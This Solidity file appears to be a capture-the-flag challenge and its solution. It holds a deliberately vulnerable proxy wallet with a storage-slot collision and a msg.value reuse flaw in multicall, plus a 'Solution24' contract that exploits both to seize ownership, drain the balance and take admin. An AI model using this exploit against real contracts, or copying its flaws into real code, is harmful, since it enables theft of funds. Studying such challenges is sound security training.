// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract PuzzleProxy is ERC1967Proxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) ERC1967Proxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, bytes memory reason) = to.call{ value: value }(data);
        require(success, string(abi.encodePacked("Execution failed", reason)));
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract PuzzleWalletFactory {
    address public walletImplement;
    address[] public wallets;

    constructor() {
        walletImplement = address(new PuzzleWallet());
    }

    function createWallet() public payable {
        require(msg.value > 0, "Need ETH");
        address addr = address(new PuzzleProxy(address(this), walletImplement, abi.encodeWithSelector(PuzzleWallet.init.selector, 1000000)));
        wallets.push(addr);
        PuzzleWallet(addr).addToWhitelist(address(this));
        PuzzleWallet(addr).deposit{value: msg.value}();
    }
}

contract Solution24 {
    address owner;
    uint256 maxBalance;

    function hack(address payable _proxy) public payable {
        require(msg.value >= 0.001 ether, "At least pay for 0.001 ether");
        // PuzzleProxy.pendingAdmin and PuzzleWallet.owner is using the same slot.
        // So that we can get ownership of PuzzleWallet by calling PuzzleProxy.proposeNewAdmin
        PuzzleProxy(_proxy).proposeNewAdmin(address(this));
        require(PuzzleWallet(_proxy).owner() == address(this), "Claiming ownership fails");

        // Add attacker contract to wahitelist for furthur attack.
        PuzzleWallet(_proxy).addToWhitelist(address(this));

        // By using multicall, we can double the balance of attacker contract.
        bytes memory depositData = abi.encodeWithSignature("deposit()");

        bytes[] memory multicallInputs = new bytes[](1);
        multicallInputs[0] = depositData;
        bytes memory multicallData = abi.encodeWithSignature("multicall(bytes[])", multicallInputs);

        bytes[] memory multicallInputs2 = new bytes[](2);
        multicallInputs2[0] = multicallData;
        multicallInputs2[1] = depositData;

        PuzzleWallet(_proxy).multicall{value: msg.value}(multicallInputs2);
        require(2*msg.value == PuzzleWallet(_proxy).balances(address(this)), string(abi.encodePacked("Balance must be doubled", PuzzleWallet(_proxy).balances(address(this)))));

        // Note that It occurs an error "Execution failed" when you are using Remix VM.
        // It works good for Rinkeby.

        // Now, drain all of balance of target contract.
        PuzzleWallet(_proxy).execute(msg.sender, 2*msg.value, "");

        // Get admin for msg.sender.
        PuzzleWallet(_proxy).setMaxBalance(uint256(uint160(msg.sender)));
        require(PuzzleProxy(_proxy).admin() == address(msg.sender), "Hack fails");
    }
}